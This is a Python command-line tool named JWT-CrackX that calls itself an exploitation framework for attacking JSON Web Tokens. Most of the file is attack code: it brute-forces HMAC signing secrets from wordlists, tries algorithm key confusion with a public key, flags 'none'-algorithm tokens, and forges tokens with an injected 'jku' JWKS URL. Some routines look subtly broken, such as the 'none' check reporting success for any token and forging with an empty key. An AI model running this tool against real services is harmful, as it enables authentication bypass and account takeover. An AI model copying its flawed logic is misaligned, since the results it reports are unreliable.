import argparse
import itertools
import json
import os
import time
import jwt
from jwt import PyJWTError
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives import serialization
from colorama import Fore, Style, init
from tqdm import tqdm


init(autoreset=True)

def print_banner():
    banner = f"""
    \t\t███████{Fore.RED}╗{Style.RESET_ALL}███████{Fore.RED}╗{Style.RESET_ALL} ██████{Fore.RED}╗{Style.RESET_ALL}██████{Fore.RED}╗ {Style.RESET_ALL}███████{Fore.RED}╗{Style.RESET_ALL}████████{Fore.RED}╗{Style.RESET_ALL}  
    \t\t██{Fore.RED}╔════╝{Style.RESET_ALL}██{Fore.RED}╔════╝{Style.RESET_ALL}██{Fore.RED}╔════╝{Style.RESET_ALL}██{Fore.RED}╔══{Style.RESET_ALL}██{Fore.RED}╗{Style.RESET_ALL}██{Fore.RED}╔════╝{Style.RESET_ALL}{Fore.RED}╚══{Style.RESET_ALL}██{Fore.RED}╔══╝{Style.RESET_ALL}
    \t\t███████{Fore.RED}╗{Style.RESET_ALL}█████{Fore.RED}╗{Style.RESET_ALL}  ██{Fore.RED}║     {Style.RESET_ALL}██{Fore.RED}║  {Style.RESET_ALL}██{Fore.RED}║{Style.RESET_ALL}█████{Fore.RED}╗     {Style.RESET_ALL}██{Fore.RED}║   {Style.RESET_ALL}  
    \t\t{Fore.RED}╚════{Style.RESET_ALL}██{Fore.RED}║{Style.RESET_ALL}██{Fore.RED}╔══╝  {Style.RESET_ALL}██{Fore.RED}║     {Style.RESET_ALL}██{Fore.RED}║  {Style.RESET_ALL}██{Fore.RED}║{Style.RESET_ALL}██{Fore.RED}╔══╝     {Style.RESET_ALL}██{Fore.RED}║   {Style.RESET_ALL}  
    \t\t███████{Fore.RED}║{Style.RESET_ALL}███████{Fore.RED}╗{Style.RESET_ALL}{Fore.RED}╚{Style.RESET_ALL}██████{Fore.RED}╗{Style.RESET_ALL}██████{Fore.RED}╔╝{Style.RESET_ALL}███████{Fore.RED}╗   {Style.RESET_ALL}██{Fore.RED}║   {Style.RESET_ALL}  
    \t\t{Fore.RED}╚══════╝╚══════╝ ╚═════╝╚═════╝ ╚══════╝   ╚═╝   {Style.RESET_ALL}  
    {Style.RESET_ALL}.______________________________________________________{Fore.RED}|_._._._._._._._._._.{Style.RESET_ALL}
    {Style.RESET_ALL} \_____________________________________________________{Fore.RED}|_#_#_#_#_#_#_#_#_#_|{Style.RESET_ALL}
                                                           {Fore.RED}l                      {Style.RESET_ALL}
    \t{Fore.RED}JWT-CrackX v2.0 {Style.RESET_ALL}| {Fore.MAGENTA}Algs: HS256/HS512/RS256/ES256/ES512 {Style.RESET_ALL}| {Fore.RED}JWKS Injection\n
    \t\t\t\t{Style.RESET_ALL}Created by {Fore.RED}SecDet Samurai{Style.RESET_ALL}
    """
    print(banner)


def batch(iterable, n=1):
    l = len(iterable)
    for ndx in range(0, l, n):
        yield iterable[ndx:min(ndx + n, l)]

class JWTScanner(object):

    SUPPORTED_ALGS = ['HS256', 'HS384', 'HS512', 'RS256', 'ES256', 'ES512']
    TOP_SECRETS = ["secret", "", "password", "123456", "jwts3cr3t!", "..."]

    def __init__(self):
        self.token = None
        self.header = None
        self.alg = None

    def validate_token(self, token: str):
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT structure")

            self.token = token
            self.header = jwt.get_unverified_header(token)
            self.alg = self.header.get('alg', '').upper()
            return True

        except Exception as e:
            self.print_error(f"Token validation failed: {str(e)}")
            return False

    def print_status(self, message: str, status: str = "info"):
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "warn": Fore.YELLOW,
            "error": Fore.RED
        }
        print(f"\n{colors[status]}[*] {message}{Style.RESET_ALL}")

    def print_error(self, message: str):
        print(f"\n{Fore.RED}[!] ERROR: {message}{Style.RESET_ALL}")

    def check_none_alg(self):
        try:
            payload = jwt.decode(self.token, options={"verify_signature": False})
            self.print_status("'none' algorithm vulnerability found!", "success")
            self.show_payload(payload)
            return True
        except Exception as e:
            self.print_error(f"None algorithm check failed: {str(e)}")
            return False

    def brute_force(self, wordlist: str, threads: int = 8):
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"Wordlist not found: {wordlist}")

        self.print_status(f"Starting brute-force with {threads} threads...", "info")

        start = time.time()
        for secret in self.TOP_SECRETS:
            try:
                jwt.decode(self.token, secret, algorithms=[self.alg])
                self.print_status(f"Found secret in common list: {secret}", "success")
                self.show_payload(jwt.decode(self.token, secret, algorithms=[self.alg]))
                return
            except PyJWTError:
                continue

        with open(wordlist, 'r', errors='ignore') as f:
            wordlist_content = f.readlines()
            total = len(wordlist_content)

            with ThreadPoolExecutor(max_workers=threads) as executor:
                chunks = batch(wordlist_content, 1000)
                progress = tqdm(total=total, desc="Processing", unit="word")

                for chunk in chunks:
                    secrets = [line.strip() for line in chunk if line.strip()]
                    futures = [executor.submit(
                        jwt.decode, self.token, s, algorithms=[self.alg]
                    ) for s in secrets]

                    for i, future in enumerate(futures):
                        try:
                            future.result()
                            progress.close()
                            self.print_status(f"Valid secret found: {secrets[i]}", "success")
                            self.show_payload(jwt.decode(self.token, secrets[i], algorithms=[self.alg]))
                            return
                        except PyJWTError:
                            progress.update(1)
                        except Exception as e:
                            progress.close()
                            raise e
                progress.close()

        self.print_error("Brute-force unsuccessful - no valid secrets found")

    def key_confusion(self, key_path: str):
        try:
            with open(key_path, 'r') as f:
                key_data = f.read()

            try:
                key = serialization.load_pem_public_key(key_data.encode())
            except ValueError:
                key = serialization.load_der_public_key(key_data.encode())

            results = {}
            for alg in self.SUPPORTED_ALGS:
                try:
                    decoded = jwt.decode(self.token, key_data, algorithms=[alg])
                    results[alg] = decoded
                except PyJWTError:
                    continue

            if results:
                self.print_status("Key confusion successful!", "success")
                for alg, payload in results.items():
                    print(f"\n{Fore.YELLOW}Algorithm: {alg}{Style.RESET_ALL}")
                    self.show_payload(payload)
            else:
                self.print_error("No valid algorithms found for key confusion")

        except Exception as e:
            self.print_error(f"Key confusion failed: {str(e)}")

    def jwks_injection(self, jwks_url: str):
        try:
            new_header = self.header.copy()
            new_header["jku"] = jwks_url

            payload = jwt.decode(self.token, options={"verify_signature": False})
            forged_token = jwt.encode(
                payload=payload,
                key="",
                algorithm=self.alg,
                headers=new_header
            )

            self.print_status("JWKS injection successful!", "success")
            print(f"\n{Fore.GREEN}Forged Token:{Style.RESET_ALL}\n{forged_token}")

        except Exception as e:
            self.print_error(f"JWKS injection failed: {str(e)}")

    def show_payload(self, payload: dict):
        print(f"\n{Fore.GREEN}Decoded Payload:{Style.RESET_ALL}")
        print(json.dumps(payload, indent=2))


def main():
    print_banner()
    scanner = JWTScanner()

    parser = argparse.ArgumentParser(
        description="JWT-CrackX Exploitation Framework",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-t', '--token', required=True, help="JWT token to analyze")
    parser.add_argument('-w', '--wordlist', help="Path to secrets wordlist")
    parser.add_argument('-p', '--pubkey', help="Path to public key file")
    parser.add_argument('--jwks', help="JWKS endpoint URL for injection")
    parser.add_argument('--threads', type=int, default=8,
                        help="Number of threads (default: 8)")

    args = parser.parse_args()

    try:
        if not scanner.validate_token(args.token):
            return

        if scanner.alg == "NONE":
            scanner.check_none_alg()
            return

        if args.wordlist and scanner.alg in ["HS256", "HS384", "HS512"]:
            scanner.brute_force(args.wordlist, args.threads)
            return

        if args.pubkey:
            scanner.key_confusion(args.pubkey)
            return

        if args.jwks:
            scanner.jwks_injection(args.jwks)
            return

        scanner.print_error("No valid attack vectors found")
        print(f"\n{Fore.YELLOW}Try:{Style.RESET_ALL}")
        print("- Use --wordlist for HS* algorithms")
        print("- Use --pubkey for key confusion")
        print("- Use --jwks for endpoint injection")

    except Exception as e:
        scanner.print_error(str(e))
    except KeyboardInterrupt:
        scanner.print_error("Operation cancelled by user")


if __name__ == "__main__":
    main()
